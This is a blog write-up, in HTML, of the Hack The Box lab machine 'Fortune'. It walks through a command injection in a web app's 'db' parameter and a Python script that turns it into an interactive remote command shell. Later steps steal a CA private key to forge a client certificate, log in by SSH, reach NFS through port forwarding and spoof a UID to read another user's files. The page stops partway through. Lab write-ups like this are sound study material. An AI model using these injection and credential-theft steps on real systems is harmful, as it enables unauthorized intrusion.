<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Fortune - Hack The Box - hackcommander.io</title>
<meta name="description" content="In this box, I use a simple command injection on the web fortune application that allows me to find the Intermediate CA certificate and its private key. After importing the certificates in Firefox, I can authenticate to the HTTPS page and access a privileged page that generates an SSH private key. Next is SSH port forwarding to access an NFS share, upload my SSH public key to escalate to another user, then recover a pgadmin database which contains the DBA password which is also the root password. Cool box overall, but it should have been rated Hard instead of Insane.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Fortune - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-fortune/">


  <meta property="og:description" content="In this box, I use a simple command injection on the web fortune application that allows me to find the Intermediate CA certificate and its private key. After importing the certificates in Firefox, I can authenticate to the HTTPS page and access a privileged page that generates an SSH private key. Next is SSH port forwarding to access an NFS share, upload my SSH public key to escalate to another user, then recover a pgadmin database which contains the DBA password which is also the root password. Cool box overall, but it should have been rated Hard instead of Insane.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-fortune/fortune_logo.png">





  <meta property="article:published_time" content="2019-08-03T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-fortune/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Posts</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Tags</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">About</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Fortune - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Fortune - Hack The Box">
    <meta itemprop="description" content="In this box, I use a simple command injection on the web fortune application that allows me to find the Intermediate CA certificate and its private key. After importing the certificates in Firefox, I can authenticate to the HTTPS page and access a privileged page that generates an SSH private key. Next is SSH port forwarding to access an NFS share, upload my SSH public key to escalate to another user, then recover a pgadmin database which contains the DBA password which is also the root password. Cool box overall, but it should have been rated Hard instead of Insane.">
    <meta itemprop="datePublished" content="August 03, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Fortune - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-08-03T00:00:00+02:00">August 03, 2019 </time> 
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-fortune/fortune_logo.png" alt=""></p>

<p>In this box, I use a simple command injection on the web fortune application that allows me to find the Intermediate CA certificate and its private key. After importing the certificates in Firefox, I can authenticate to the HTTPS page and access a privileged page that generates an SSH private key. Next is SSH port forwarding to access an NFS share, upload my SSH public key to escalate to another user, then recover a pgadmin database which contains the DBA password which is also the root password. Cool box overall, but it should have been rated Hard instead of Insane.</p>

<h2 id="summary">Summary</h2>

<ul>
  <li>There’s a command injection found in the <code class="language-plaintext highlighter-rouge">db</code> parameter of the web fortune application</li>
  <li>The intermediate CA private key is found in a directory that I can access through the command injection</li>
  <li>I can generate a client certificate that I will use to access the ssh authentication web page</li>
  <li>After generating an SSH private keym, I can establish an SSH session as user <code class="language-plaintext highlighter-rouge">nfsuser</code>
</li>
  <li>By port-forwarding port 2049 I can mount the <code class="language-plaintext highlighter-rouge">/home</code> directory of the NFS server</li>
  <li>With NFS I write my SSH public key into the <code class="language-plaintext highlighter-rouge">charlie</code> user directory and gain SSH access there</li>
  <li>The pgadmin application database is exposed and I can recover the dba account password since I have the encrypted value and the decryption key</li>
  <li>Based on a note found when I first got access, I know the dba password is the same as the root account and I can <code class="language-plaintext highlighter-rouge">su</code> to gain root access</li>
</ul>

<h2 id="detailed-steps">Detailed steps</h2>

<h3 id="nmap">Nmap</h3>

<p>This box runs SSH and the OpenBSD httpd web server with both HTTP and HTTPS ports open.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- -oA fortune fortune.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-09 19:01 EST
Nmap scan report for fortune.htb (10.10.10.127)
Host is up (0.012s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp  open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
</code></pre></div></div>

<h3 id="command-injection-on-the-fortune-web-app">Command injection on the fortune web app</h3>

<p>The website shows a list of databases that I can select, then it runs the <code class="language-plaintext highlighter-rouge">fortune</code> application to return random quotes.</p>

<p>From the man page:</p>
<blockquote>
  <p>fortune — print a random, hopefully interesting, adage</p>
</blockquote>

<p><img src="/assets/images/htb-writeup-fortune/fortune1.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-fortune/fortune2.png" alt=""></p>

<p>The fortune web app has a pretty trivial command injection vulnerability. It simply appends what I pass in the <code class="language-plaintext highlighter-rouge">db</code> parameter to the <code class="language-plaintext highlighter-rouge">fortune</code> application call. I can run arbitrary commands and programs simply by adding a semi-colon after the database name.</p>

<p>The example here shows I can run <code class="language-plaintext highlighter-rouge">id</code> and list the root directory:</p>

<p><img src="/assets/images/htb-writeup-fortune/fortune3.png" alt=""></p>

<p>Because I wasn’t sure how much time I’d need to spend poking around the system through that command injection vulnerability, I wrote a quick python script that runs commands and cleans up the output. The output of all commands is displayed to screen and also saved to <code class="language-plaintext highlighter-rouge">output.txt</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">readline</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"output.txt"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"db"</span><span class="p">:</span> <span class="s">";echo '****';{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://fortune.htb/select"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"\*\*\*\*(.*)&lt;/pre&gt;"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">m</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"CMD: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</code></pre></div></div>

<p>Here’s what the output looks like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -l

total 56
drwxrwxrwx  2 _fortune  _fortune    512 Nov  2 23:39 __pycache__
-rw-r--r--  1 root      _fortune    341 Nov  2 22:58 fortuned.ini
-rw-r-----  1 _fortune  _fortune  14581 Mar  9 19:03 fortuned.log
-rw-rw-rw-  1 _fortune  _fortune      6 Mar  9 18:38 fortuned.pid
-rw-r--r--  1 root      _fortune    413 Nov  2 22:59 fortuned.py
drwxr-xr-x  2 root      _fortune    512 Nov  2 22:57 templates
-rw-r--r--  1 root      _fortune     67 Nov  2 22:59 wsgi.py

&gt; tail -n 10 /etc/passwd

_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin
_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin
_postgresql:*:503:503:PostgreSQL Manager:/var/postgresql:/bin/sh
_pgadmin4:*:511:511::/usr/local/pgadmin4:/usr/local/bin/bash
_fortune:*:512:512::/var/appsrv/fortune:/sbin/nologin
_sshauth:*:513:513::/var/appsrv/sshauth:/sbin/nologin
nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh
nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
</code></pre></div></div>

<p>The user <code class="language-plaintext highlighter-rouge">_fortune</code> has <code class="language-plaintext highlighter-rouge">/sbin/nologin</code> for his shell so I can’t just upload my SSH keys to get a real shell through SSH.</p>

<h3 id="looking-around-the-box-as-user-_fortune">Looking around the box as user _fortune</h3>

<p>The previous box by AuxSarge had some special SSH configuration that made use of a local database to check the public keys of users. The first thing I did on this box was check the SSH configuration to see if there was something similar:</p>

<p><code class="language-plaintext highlighter-rouge">/etc/ssh/sshd_config</code> has a special configuration for user <code class="language-plaintext highlighter-rouge">nfuser</code> that looks up the public key in a postgresql database instead of <code class="language-plaintext highlighter-rouge">.ssh</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Match User nfsuser
	AuthorizedKeysFile none
	AuthorizedKeysCommand /usr/local/bin/psql -Aqt -c "SELECT key from authorized_keys where uid = '%u';" authpf appsrv
	AuthorizedKeysCommandUser _sshauth
</code></pre></div></div>

<p>I spotted another web app in <code class="language-plaintext highlighter-rouge">/var/appsrv/sshauth</code> I didn’t find in my initial enumeration. It’s written in Python and running the Flask framework.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -l /var/appsrv

total 12
drwxr-xr-x  4 _fortune   _fortune  512 Feb  3 05:08 fortune
drwxr-x---  4 _pgadmin4  wheel     512 Nov  3 10:58 pgadmin4
drwxr-xr-x  4 _sshauth   _sshauth  512 Feb  3 05:08 sshauth

&gt; ls -l /var/appsrv/sshauth

total 52
drwxrwxrwx  2 _sshauth  _sshauth    512 Nov  2 23:39 __pycache__
-rw-r--r--  1 _sshauth  _sshauth    341 Nov  2 23:10 sshauthd.ini
-rw-r-----  1 _sshauth  _sshauth  13371 Mar  9 18:39 sshauthd.log
-rw-rw-rw-  1 _sshauth  _sshauth      6 Mar  9 18:38 sshauthd.pid
-rw-r--r--  1 _sshauth  _sshauth   1799 Nov  2 23:12 sshauthd.py
drwxr-xr-x  2 _sshauth  _sshauth    512 Nov  2 23:08 templates
-rw-r--r--  1 _sshauth  _sshauth     67 Nov  2 23:06 wsgi.py
</code></pre></div></div>

<p>I can see with <code class="language-plaintext highlighter-rouge">ps</code> that the application is running through <code class="language-plaintext highlighter-rouge">uwsgi</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ps waux | grep sshauth

_sshauth 39927  0.0  2.5 19164 26268 ??  S      6:38PM    0:00.41 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log
_sshauth  4866  0.0  0.5 19164  5588 ??  I      6:38PM    0:00.00 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log
_sshauth 13512  0.0  0.5 19168  5564 ??  I      6:38PM    0:00.00 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log
_sshauth 18294  0.0  0.5 19168  5564 ??  I      6:38PM    0:00.00 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log
</code></pre></div></div>

<p>The web app has a route for <code class="language-plaintext highlighter-rouge">/generate</code> which calls a function that generates a new SSH keypair and displays it to the user.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/generate'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">sshauthd</span><span class="p">():</span>

  <span class="c1"># SSH key generation code courtesy of:
</span>  <span class="c1"># https://msftstack.wordpress.com/2016/10/15/generating-rsa-keys-with-python-3/
</span>  <span class="c1">#
</span>  <span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>
  <span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.asymmetric</span> <span class="kn">import</span> <span class="n">rsa</span>
  <span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>

  <span class="c1"># generate private/public key pair
</span>  <span class="n">key</span> <span class="o">=</span> <span class="n">rsa</span><span class="p">.</span><span class="n">generate_private_key</span><span class="p">(</span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">(),</span> <span class="n">public_exponent</span><span class="o">=</span><span class="mi">65537</span><span class="p">,</span> \
    <span class="n">key_size</span><span class="o">=</span><span class="mi">2048</span><span class="p">)</span>

  <span class="c1"># get public key in OpenSSH format
</span>  <span class="n">public_key</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">public_key</span><span class="p">().</span><span class="n">public_bytes</span><span class="p">(</span><span class="n">serialization</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">OpenSSH</span><span class="p">,</span> \
    <span class="n">serialization</span><span class="p">.</span><span class="n">PublicFormat</span><span class="p">.</span><span class="n">OpenSSH</span><span class="p">)</span>

  <span class="c1"># get private key in PEM container format
</span>  <span class="n">pem</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">private_bytes</span><span class="p">(</span><span class="n">encoding</span><span class="o">=</span><span class="n">serialization</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">PEM</span><span class="p">,</span>
    <span class="nb">format</span><span class="o">=</span><span class="n">serialization</span><span class="p">.</span><span class="n">PrivateFormat</span><span class="p">.</span><span class="n">TraditionalOpenSSL</span><span class="p">,</span>
    <span class="n">encryption_algorithm</span><span class="o">=</span><span class="n">serialization</span><span class="p">.</span><span class="n">NoEncryption</span><span class="p">())</span>

  <span class="c1"># decode to printable strings
</span>  <span class="n">private_key_str</span> <span class="o">=</span> <span class="n">pem</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
  <span class="n">public_key_str</span> <span class="o">=</span> <span class="n">public_key</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>

  <span class="n">db_response</span> <span class="o">=</span> <span class="n">db_write</span><span class="p">(</span><span class="n">public_key_str</span><span class="p">)</span>

  <span class="k">if</span> <span class="n">db_response</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'error.html'</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'display.html'</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key_str</span><span class="p">,</span> <span class="n">public_key</span><span class="o">=</span><span class="n">public_key_str</span><span class="p">)</span>
</code></pre></div></div>

<p>Looking at the <code class="language-plaintext highlighter-rouge">httpd.conf</code> configuration file, I see that the <code class="language-plaintext highlighter-rouge">/generate</code> route is accessible only on the HTTPS port. However I can’t access the HTTPS port because the server is configured for client certificate authentication.</p>

<p><img src="/assets/images/htb-writeup-fortune/ssl_fail.png" alt=""></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cat /etc/httpd.conf

server "fortune.htb" {
        listen on * port 80

        location "/" {
                root "/htdocs/fortune"
        }

        location "/select" {
                fastcgi socket "/run/fortune/fortuned.socket"
        }
}

server "fortune.htb" {
        listen on * tls port 443
        tls client ca "/etc/ssl/ca-chain.crt"
        location "/" {
                root "/htdocs/sshauth"
        }
        location "/generate" {
                fastcgi socket "/run/sshauth/sshauthd.socket"
        }
}
</code></pre></div></div>

<p>I keep looking and find a boatload of certificates in bob’s home directory:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -lR /home/bob

total 8
drwxr-xr-x  7 bob  bob  512 Oct 29 20:57 ca
drwxr-xr-x  2 bob  bob  512 Nov  2 22:40 dba

/home/bob/ca:
total 48
drwxr-xr-x  2 bob  bob   512 Oct 29 20:44 certs
drwxr-xr-x  2 bob  bob   512 Oct 29 20:37 crl
-rw-r--r--  1 bob  bob   115 Oct 29 20:56 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29 20:56 index.txt.attr
-rw-r--r--  1 bob  bob     0 Oct 29 20:37 index.txt.old
drwxr-xr-x  7 bob  bob   512 Nov  3 15:37 intermediate
drwxr-xr-x  2 bob  bob   512 Oct 29 20:56 newcerts
-rw-r--r--  1 bob  bob  4200 Oct 29 20:55 openssl.cnf
drwx------  2 bob  bob   512 Oct 29 20:41 private
-rw-r--r--  1 bob  bob     5 Oct 29 20:56 serial
-rw-r--r--  1 bob  bob     5 Oct 29 20:37 serial.old

/home/bob/ca/certs:
total 8
-r--r--r--  1 bob  bob  2053 Oct 29 20:44 ca.cert.pem

/home/bob/ca/crl:

/home/bob/ca/intermediate:
total 52
drwxr-xr-x  2 bob  bob   512 Nov  3 15:40 certs
drwxr-xr-x  2 bob  bob   512 Oct 29 20:46 crl
-rw-r--r--  1 bob  bob     5 Oct 29 20:47 crlnumber
drwxr-xr-x  2 bob  bob   512 Oct 29 21:13 csr
-rw-r--r--  1 bob  bob   107 Oct 29 21:13 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29 21:13 index.txt.attr
drwxr-xr-x  2 bob  bob   512 Oct 29 21:13 newcerts
-rw-r--r--  1 bob  bob  4328 Oct 29 20:56 openssl.cnf
drwxr-xr-x  2 bob  bob   512 Oct 29 21:13 private
-rw-r--r--  1 bob  bob     5 Oct 29 21:13 serial
-rw-r--r--  1 bob  bob     5 Oct 29 21:13 serial.old

/home/bob/ca/intermediate/certs:
total 24
-r--r--r--  1 bob  bob  4114 Oct 29 20:58 ca-chain.cert.pem
-r--r--r--  1 bob  bob  1996 Oct 29 21:13 fortune.htb.cert.pem
-r--r--r--  1 bob  bob  2061 Oct 29 20:56 intermediate.cert.pem

/home/bob/ca/intermediate/crl:

/home/bob/ca/intermediate/csr:
total 8
-rw-r--r--  1 bob  bob  1013 Oct 29 21:12 fortune.htb.csr.pem
-rw-r--r--  1 bob  bob  1716 Oct 29 20:53 intermediate.csr.pem

/home/bob/ca/intermediate/newcerts:
total 4
-rw-r--r--  1 bob  bob  1996 Oct 29 21:13 1000.pem

/home/bob/ca/intermediate/private:
total 12
-r--------  1 bob  bob  1675 Oct 29 21:10 fortune.htb.key.pem
-rw-r--r--  1 bob  bob  3243 Oct 29 20:48 intermediate.key.pem

/home/bob/ca/newcerts:
total 8
-rw-r--r--  1 bob  bob  2061 Oct 29 20:56 1000.pem

/home/bob/ca/private:

/home/bob/dba:
total 4
-rw-r--r--  1 bob  bob  195 Nov  2 22:40 authpf.sql
</code></pre></div></div>

<p>I compare the CA cert used by the <code class="language-plaintext highlighter-rouge">httpd</code> service with the certs found in the folder and I find a match for the intermediate CA cert.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; md5 /etc/ssl/ca-chain.crt
MD5 (/etc/ssl/ca-chain.crt) = b5217e28843aace50f46951bc136632e

&gt; md5 /home/bob/ca/intermediate/certs/ca-chain.cert.pem
MD5 (/home/bob/ca/intermediate/certs/ca-chain.cert.pem) = b5217e28843aace50f46951bc136632e
</code></pre></div></div>

<p>The intermediate CA cert <code class="language-plaintext highlighter-rouge">/home/bob/ca/intermediate/certs/intermediate.cert.pem</code> and its private key <code class="language-plaintext highlighter-rouge">/home/bob/ca/intermediate/private/intermediate.key.pem</code> are both readable by my user.</p>

<p>I download both Intermediate CA files and the CA cert on my machine then I combined the Intermediate CA cert and its private key into a PKCS12 package:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs12 -export -inkey intermediate.key.pem -in intermediate.cert.pem -out snowscan.p12
</code></pre></div></div>

<p>I’ll import both the Intermediate and CA certs into my Firefox trusted autorities store:</p>

<p><img src="/assets/images/htb-writeup-fortune/https1.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-fortune/https2.png" alt=""></p>

<p>Next, I import the PKCS12 file into my personal certificate storage:</p>

<p><img src="/assets/images/htb-writeup-fortune/https3.png" alt=""></p>

<p>I’m prompted to chose a cert when connecting to the webpage</p>

<p><img src="/assets/images/htb-writeup-fortune/https4.png" alt=""></p>

<p>I’m now able to access the HTTPS page:</p>

<p><img src="/assets/images/htb-writeup-fortune/https5.png" alt=""></p>

<h3 id="generating-a-new-ssh-key-for-user-nfsuser">Generating a new SSH key for user nfsuser</h3>

<p>When I go to <code class="language-plaintext highlighter-rouge">https://fortune.htb/generate</code>, a new SSH keypair is generated and the private key is displayed:</p>

<p><img src="/assets/images/htb-writeup-fortune/privatekey.png" alt=""></p>

<p>I can grab this key and use it to SSH as user <code class="language-plaintext highlighter-rouge">nfsuser</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># vi fortune.key
# chmod 400 fortune.key
# ssh -i fortune.key nfsuser@10.10.10.127

Hello nfsuser. You are authenticated from host "10.10.14.23"
</code></pre></div></div>

<p>I don’t get a prompt however. Looking at the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, I see that this user doesn’t have a shell associated with him:</p>

<p><code class="language-plaintext highlighter-rouge">nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf</code></p>

<p>Because the user is named <code class="language-plaintext highlighter-rouge">nfsuser</code>, it’s safe to assume there is something exported by NFS. I can see this in the <code class="language-plaintext highlighter-rouge">/etc/exports</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cat /etc/exports

/home
</code></pre></div></div>

<p>The NFS port 2049 is firewalled but I can still access it by using local port forwarding in SSH.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ssh -i fortune.key -L 2049:fortune.htb:2049 nfsuser@fortune.htb
Last login: Sat Mar  9 20:08:55 2019 from 10.10.14.23

Hello nfsuser. You are authenticated from host "10.10.14.23"
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># mount -t nfs fortune.htb:/home /mnt
# ls -l /mnt
total 6
drwxr-xr-x 5 revssh   revssh   512 Nov  3 16:29 bob
drwxr-x--- 3 test1324 test1324 512 Nov  5 22:02 charlie
drwxr-xr-x 2     1002     1002 512 Nov  2 22:39 nfsuser
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">charlie</code> user directory is mapped to user ID 1000. I already has a user ID 1000 created on my Kali Linux box with the name <code class="language-plaintext highlighter-rouge">test1324</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># grep test1324 /etc/passwd
test1324:x:1000:1000::/home/test1324:/bin/bash
</code></pre></div></div>

<p>To access <code class="language-plaintext highlighter-rouge">charlie</code>, I simply change to user <code class="language-plaintext highlighter-rouge">test1324</code> then I’m to access the files and the user flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~/htb/fortune# su test1324
test1324@ragingunicorn:/root/htb/fortune$ cd /mnt/charlie
test1324@ragingunicorn:/mnt/charlie$ ls
mbox  user.txt
test1324@ragingunicorn:/mnt/charlie$ cat user.txt
ada0af...
</code></pre></div></div>

<p>There’s a mailbox file with a hint that we should look or the dba password next so we can log in as root:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test1324@ragingunicorn:/mnt/charlie$ cat mbox
From bob@fortune.htb Sat Nov  3 11:18:51 2018
Return-Path: &lt;bob@fortune.htb&gt;
Delivered-To: charlie@fortune.htb
Received: from localhost (fortune.htb [local])
	by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
	for &lt;charlie@fortune.htb&gt;;
	Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
From:  &lt;bob@fortune.htb&gt;
Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
To: charlie@fortune.htb
Subject: pgadmin4
Message-ID: &lt;196699abe1fed384@fortune.htb&gt;
Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob
</code></pre></div></div>

<p>To get a proper shell, I added my SSH key to <code class="language-plaintext highlighter-rouge">authorized_keys</code>:</p>

